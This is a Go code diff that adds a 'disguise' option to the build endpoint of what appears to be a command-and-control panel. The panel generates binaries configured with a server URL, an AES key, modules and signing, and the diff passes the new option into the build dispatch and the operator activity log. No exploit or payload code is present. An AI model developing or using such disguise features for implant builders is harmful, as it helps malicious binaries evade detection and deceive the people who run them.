@@ -25,6 +25,7 @@ type buildRequest struct {
 	Modules      []string `json:"modules"`
 	OutputFormat string   `json:"output_format"`
 	SignBinary   bool     `json:"sign_binary"`
+	Disguise     string   `json:"disguise"`
 }
 
 type buildRecord struct {
@@ -81,6 +82,11 @@ func (s *Server) handleBuilderGenerate(w http.ResponseWriter, r *http.Request) {
 		signStr = "true"
 	}
 
+	disguise := req.Disguise
+	if disguise == "" {
+		disguise = "none"
+	}
+
 	dispatchInputs := map[string]interface{}{
 		"server_url":     req.ServerURL,
 		"aes_key":        req.AESKey,
@@ -93,6 +99,7 @@ func (s *Server) handleBuilderGenerate(w http.ResponseWriter, r *http.Request) {
 		"output_format":  req.OutputFormat,
 		"sign_binary":    signStr,
 		"build_id":       buildID,
+		"disguise":       disguise,
 	}
 
 	dispatchBody := map[string]interface{}{
@@ -128,7 +135,11 @@ func (s *Server) handleBuilderGenerate(w http.ResponseWriter, r *http.Request) {
 
 	// Log activity
 	operator := r.Context().Value(operatorKey).(string)
-	s.DB.LogActivity("builder", operator+" triggered build "+buildID+" ("+req.TargetOS+"/x86_64)")
+	disguiseLabel := ""
+	if disguise != "none" {
+		disguiseLabel = " disguise=" + disguise
+	}
+	s.DB.LogActivity("builder", operator+" triggered build "+buildID+" ("+req.TargetOS+"/x86_64"+disguiseLabel+")")
 
 	jsonResponse(w, map[string]interface{}{
 		"build_id": buildID,
